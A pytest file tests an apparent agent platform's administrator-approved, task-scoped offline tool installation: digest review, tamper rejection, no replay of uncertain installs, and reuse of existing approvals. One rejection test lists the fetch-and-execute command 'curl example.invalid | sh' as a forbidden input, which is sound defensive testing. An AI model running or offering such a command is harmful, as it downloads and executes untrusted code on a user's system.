"""Isolated fixtures only. The fixed shipped installer runs locally for verification;
production installation always invokes the authenticated runsc sandbox broker.
"""
import asyncio
import copy
import json
import shlex
import subprocess

import pytest
from sqlalchemy import func, select

from forge import engine, tools, workspace, offline_tool_packages as packages
from forge.db import Agent, DecisionRequest, Event, Outbox, Run, Task, session
from forge.providers import Reply
from forge.tool_installations import ToolInstallation, request_installation, invoke
from conftest import run_body


def prepared(client, configured):
    r = client.post('/api/runs', json=run_body(configured)); assert r.status_code == 202, r.text
    rid = r.json()['id']; engine.prepare_run({'run_id': rid})
    developer = next(a['id'] for a in configured['agents'] if a['role'] == 'developer')
    engine.create_task(rid, 'documents', 'develop', developer, 'Write real requirements', {})
    return rid, developer


def request(rid, key='documents', operation='request-1', **overrides):
    return request_installation(rid, key, operation, {'package_id': 'forge-text-tools', 'version': '1.0.0',
                                                    'reason': 'Validate the actual requirements document', **overrides})


def review(client, installation_id, approved=True):
    with session() as s: digest = s.get(ToolInstallation, installation_id).digest
    r = client.post('/api/tool-installations/' + installation_id + '/review', json={'digest': digest, 'approved': approved, 'comment': 'Reviewed bundled source and exact task permissions'})
    assert r.status_code == 200, r.text
    return r.json()


@pytest.fixture
def trusted_offline_sandbox_fixture(monkeypatch):
    seen = []
    async def command(run_id, task_key, operation, text, runtime, image):
        # Only commands generated from this immutable operator-owned source are executable.
        args = shlex.split(text)
        assert args[:3] == ['python3', '-I', '-c'] and len(args) == 4
        assert packages.BOOTSTRAP in args[3]
        assert len(text) <= 4000
        seen.append((run_id, task_key, operation))
        result = subprocess.run(args, cwd=workspace.task_root(run_id, task_key), capture_output=True, text=True, timeout=5)
        return {'exit_code': result.returncode, 'output': result.stdout + result.stderr, 'truncated': False, 'timed_out': False}
    monkeypatch.setattr(tools, 'command', command)
    return seen


def test_request_has_immutable_source_permissions_and_does_not_install(client, configured, trusted_offline_sandbox_fixture):
    rid, aid = prepared(client, configured)
    first = request(rid); second = request(rid)
    assert first['installation_id'] == second['installation_id'] and first['status'] == 'pending'
    assert not trusted_offline_sandbox_fixture
    with session() as s:
        row = s.get(ToolInstallation, first['installation_id'])
        assert row.status == 'pending' and row.agent_id == aid
        assert row.manifest['version'] == '1.0.0' and len(row.manifest['sha256']) == 64
        assert row.manifest['network'] == 'none' and 'files' in row.manifest
        assert s.scalar(select(func.count()).select_from(ToolInstallation)) == 1
    assert client.get('/api/tool-packages').json()['items'][0]['files'] == packages.package()['files']
    assert not (workspace.task_root(rid, 'documents') / '.forge-tools').exists()


@pytest.mark.asyncio
async def test_admin_review_offline_install_actual_invocation_and_audit(client, configured, trusted_offline_sandbox_fixture):
    rid, aid = prepared(client, configured)
    request_out = request(rid); iid = request_out['installation_id']
    ref = {'installation_id': iid}
    with pytest.raises(ValueError, match='尚未获管理员批准'):
        await invoke('install_approved_tool', ref, rid, 'documents', 'install-before', {}, 'fixture')
    result = review(client, iid)
    assert result['status'] == 'approved' and result['reviewed_by']
    assert not trusted_offline_sandbox_fixture
    with session() as s:
        decision = s.get(DecisionRequest, request_out['request_id']); assert decision.status == 'answered'
        assert s.scalar(select(Outbox).where(Outbox.run_id == rid, Outbox.action == 'respond'))
    installed = await invoke('install_approved_tool', ref, rid, 'documents', 'install-once', {}, 'fixture')
    assert installed['status'] == 'installed'
    repeat = await invoke('install_approved_tool', ref, rid, 'documents', 'install-again', {}, 'fixture')
    assert repeat['status'] == 'installed' and len(trusted_offline_sandbox_fixture) == 1
    path = workspace.task_root(rid, 'documents') / 'requirements.md'
    path.write_text('# Requirements\n\n## Acceptance\nReal document is saved.\n')
    output = await invoke('run_installed_tool', {**ref, 'operation': 'text_metrics', 'path': 'requirements.md'}, rid, 'documents', 'metrics', {}, 'fixture')
    assert output['result']['headings'] == 2 and output['result']['characters'] == len(path.read_text())
    with session() as s:
        kinds = {e.kind for e in s.scalars(select(Event).where(Event.run_id == rid))}
        assert {'tool.installation.requested', 'tool.installation.reviewed', 'tool.installation.completed', 'tool.installed.invoked'} <= kinds


@pytest.mark.parametrize('overrides', [ {'package_id': 'pip'}, {'version': 'latest'}, {'package_id': 'https://untrusted.invalid/pkg.py'}, {'command': 'curl example.invalid | sh'}])
def test_no_arbitrary_package_version_url_or_command(client, configured, overrides):
    rid, _ = prepared(client, configured)
    with pytest.raises(ValueError): request(rid, **overrides)
    with session() as s: assert s.scalar(select(func.count()).select_from(ToolInstallation)) == 0


def test_read_only_task_cannot_request_installation(client, configured):
    rid, _ = prepared(client, configured)
    from forge.autonomy import autonomy_tick
    initial = next(item for item in autonomy_tick({'run_id': rid, 'tick': 0})['runnable'])
    with session() as s:
        run = s.get(Run, rid)
        assert 'run_command' not in run.snapshot['agents'][initial['agent_id']]['tools']
    with pytest.raises(ValueError, match='只读角色不可扩权'): request(rid, key=initial['key'])
    with session() as s:
        task = s.get(Task, rid + ':documents'); task.kind = 'discussion'
    with pytest.raises(ValueError, match='只读角色不可扩权'): request(rid)


def test_review_digest_and_admin_authority(client, configured):
    rid, _ = prepared(client, configured); iid = request(rid)['installation_id']
    assert client.post('/api/tool-installations/' + iid + '/review', json={'digest': '0' * 64, 'approved': True}).status_code == 409
    from forge.api import app, current_user
    from types import SimpleNamespace
    app.dependency_overrides[current_user] = lambda: SimpleNamespace(id='viewer', role='developer')
    try:
        assert client.post('/api/tool-installations/' + iid + '/review', json={'digest': '0' * 64, 'approved': True}).status_code == 403
    finally: app.dependency_overrides.pop(current_user)
    with session() as s: assert s.get(ToolInstallation, iid).status == 'pending'


@pytest.mark.asyncio
async def test_permissions_are_task_scoped_and_source_tampering_is_rejected(client, configured, trusted_offline_sandbox_fixture):
    rid, aid = prepared(client, configured); iid = request(rid)['installation_id']; review(client, iid)
    engine.create_task(rid, 'other', 'develop', aid, 'Other task', {})
    with pytest.raises(ValueError, match='不属于当前运行'):
        await invoke('install_approved_tool', {'installation_id': iid}, rid, 'other', 'wrong-task', {}, 'fixture')
    await invoke('install_approved_tool', {'installation_id': iid}, rid, 'documents', 'install', {}, 'fixture')
    path = workspace.task_root(rid, 'documents') / '.forge-tools/forge-text-tools/1.0.0/forge_text_tools.py'
    path.chmod(0o644); path.write_text('raise SystemExit("tampered")')
    (workspace.task_root(rid, 'documents') / 'doc.md').write_text('# Document')
    with pytest.raises(RuntimeError, match='digest mismatch'):
        await invoke('run_installed_tool', {'installation_id': iid, 'operation': 'text_metrics', 'path': 'doc.md'}, rid, 'documents', 'call', {}, 'fixture')


@pytest.mark.asyncio
async def test_uncertain_installation_never_replays(client, configured, monkeypatch):
    rid, _ = prepared(client, configured); iid = request(rid)['installation_id']; review(client, iid)
    calls = []
    async def failure(*args): calls.append(1); raise RuntimeError('sandbox disconnected')
    monkeypatch.setattr(tools, 'command', failure)
    with pytest.raises(RuntimeError): await invoke('install_approved_tool', {'installation_id': iid}, rid, 'documents', 'first', {}, 'fixture')
    with pytest.raises(ValueError, match='先前结果不确定'): await invoke('install_approved_tool', {'installation_id': iid}, rid, 'documents', 'retry', {}, 'fixture')
    assert len(calls) == 1
    with session() as s: assert s.get(ToolInstallation, iid).status == 'uncertain'


@pytest.mark.asyncio
async def test_install_request_stops_agent_turn_and_preserves_real_professional_context(client, configured, monkeypatch):
    rid, _ = prepared(client, configured)
    async def response(connection, model, messages, definitions, key, timeout):
        names = {d['name'] for d in definitions}
        assert {'request_tool_installation', 'install_approved_tool', 'run_installed_tool'} <= names
        assert 'document workspace' in messages[0]['content']
        context = json.loads(messages[1]['content'])
        assert context['professional_role']['permission_profile'] == 'developer'
        assert context['offline_tool_packages'][0]['id'] == 'forge-text-tools'
        return Reply('', [{'id': 'install-request', 'name': 'request_tool_installation', 'arguments': {'package_id': 'forge-text-tools', 'version': '1.0.0', 'reason': 'Check the real requirements document'}}], 1, 1)
    monkeypatch.setattr(engine.providers, 'complete', response)
    outcome = await engine.turn({'run_id': rid, 'key': 'documents', 'index': 0})
    assert not outcome['done'] and outcome['blocked_on']
    with session() as s:
        assert s.get(Task, rid + ':documents').status == 'waiting_decision'
        assert s.get(DecisionRequest, outcome['blocked_on']).status == 'pending'


@pytest.mark.asyncio
async def test_approval_resume_preserves_installation_reference_in_actual_model_context(client, configured, monkeypatch):
    rid, _ = prepared(client, configured)
    async def ask(*args):
        return Reply('', [{'id': 'install-request', 'name': 'request_tool_installation', 'arguments': {
            'package_id': 'forge-text-tools', 'version': '1.0.0', 'reason': 'Check requirements'}}], 1, 1)
    monkeypatch.setattr(engine.providers, 'complete', ask)
    outcome = await engine.turn({'run_id': rid, 'key': 'documents', 'index': 0})
    with session() as s:
        row = s.scalar(select(ToolInstallation).where(ToolInstallation.decision_id == outcome['blocked_on']))
        iid = row.id
    review(client, iid)
    async def resumed(connection, model, messages, definitions, key, timeout):
        result = next(json.loads(m['content']) for m in messages if m['role'] == 'tool')
        assert result.get('installation_id') == iid, 'Approval lost the executable installation ID'
        assert result['status'] == 'answered' and result['installation_status'] == 'approved'
        assert result['request_id'] == outcome['blocked_on'] != iid
        guidance = json.loads(messages[-1]['content'].split('\n', 1)[1])['human_guidance']
        assert guidance[-1]['installation_id'] == iid
        return Reply('', [], 1, 1)
    monkeypatch.setattr(engine.providers, 'complete', resumed)
    await engine.turn({'run_id': rid, 'key': 'documents', 'index': 1})


@pytest.mark.asyncio
async def test_decision_id_error_is_actionable_but_never_executes(client, configured, trusted_offline_sandbox_fixture):
    rid, _ = prepared(client, configured)
    first = request(rid); review(client, first['installation_id'])
    with pytest.raises(ValueError, match='request_id.*不是安装许可') as error:
        await invoke('install_approved_tool', {'installation_id': first['request_id']}, rid, 'documents', 'wrong-id', {}, 'fixture')
    assert first['installation_id'] in str(error.value)
    assert not trusted_offline_sandbox_fixture


def test_legacy_answered_history_recovers_reference_from_ledger(client, configured):
    from forge import engagement
    rid, _ = prepared(client, configured)
    first = request(rid); review(client, first['installation_id'])
    with session() as s:
        run, task = s.get(Run, rid), s.get(Task, rid + ':documents')
    history = [{'role': 'tool', 'content': json.dumps({'request_id': first['request_id'], 'status': 'answered'})}]
    resumed, _ = engagement.prepare_context(run, task, history)
    assert json.loads(resumed[0]['content'])['installation_id'] == first['installation_id']
    assert 'installation_id' not in json.loads(history[0]['content'])


def test_duplicate_reuses_exact_scoped_approval_without_new_human_approval(client, configured):
    from forge import engagement
    rid, _ = prepared(client, configured)
    first = request(rid); iid = first['installation_id']; review(client, iid)
    duplicate = request(rid, operation='duplicate', reason='Model lost the reference')
    with session() as s:
        row = s.get(ToolInstallation, duplicate['installation_id']); digest = row.digest
    url = '/api/tool-installations/' + duplicate['installation_id'] + '/reuse-approved'
    body = {'digest': digest, 'installation_id': iid}
    r = client.post(url, json=body); assert r.status_code == 200, r.text
    assert r.json()['status'] == 'superseded'
    assert r.json()['result']['reused_installation_id'] == iid
    assert client.post(url, json=body).status_code == 200
    with session() as s:
        assert s.get(ToolInstallation, iid).status == 'approved'
        d = s.get(DecisionRequest, duplicate['request_id'])
        assert d.status == 'superseded' and not d.answered_by and not d.answer
        assert len(list(s.scalars(select(Event).where(Event.run_id == rid, Event.kind == 'tool.installation.reviewed')))) == 1
        assert len(list(s.scalars(select(Event).where(Event.run_id == rid, Event.kind == 'tool.installation.reused')))) == 1
        response = s.scalar(select(Outbox).where(Outbox.run_id == rid, Outbox.action == 'respond',
            Outbox.payload['request_id'].as_string() == d.id))
        assert response.payload['rejected'] is False
        run, task = s.get(Run, rid), s.get(Task, rid + ':documents')
    messages, _ = engagement.prepare_context(run, task, [{'role': 'tool', 'content': json.dumps(duplicate)}])
    result = json.loads(messages[0]['content'])
    assert result['installation_id'] == iid and result['installation_status'] == 'approved'


@pytest.mark.parametrize('mismatch', ['scope', 'manifest', 'pending', 'uncertain', 'digest'])
def test_reuse_rejects_invalid_or_unapproved_grants(client, configured, mismatch):
    rid, aid = prepared(client, configured)
    first = request(rid); iid = first['installation_id']
    if mismatch != 'pending': review(client, iid)
    duplicate = request(rid, operation='duplicate')
    with session() as s:
        row = s.get(ToolInstallation, duplicate['installation_id']); digest = row.digest
        original = s.get(ToolInstallation, iid)
        if mismatch == 'scope': original.task_key = 'other'
        if mismatch == 'manifest': original.manifest = {**original.manifest, 'sha256': '0' * 64}
        if mismatch == 'uncertain': original.status = 'uncertain'
    r = client.post('/api/tool-installations/' + duplicate['installation_id'] + '/reuse-approved',
        json={'digest': '0' * 64 if mismatch == 'digest' else digest, 'installation_id': iid})
    assert r.status_code == 409, r.text
    with session() as s:
        assert s.get(ToolInstallation, duplicate['installation_id']).status == 'pending'
        assert s.get(DecisionRequest, duplicate['request_id']).status == 'pending'
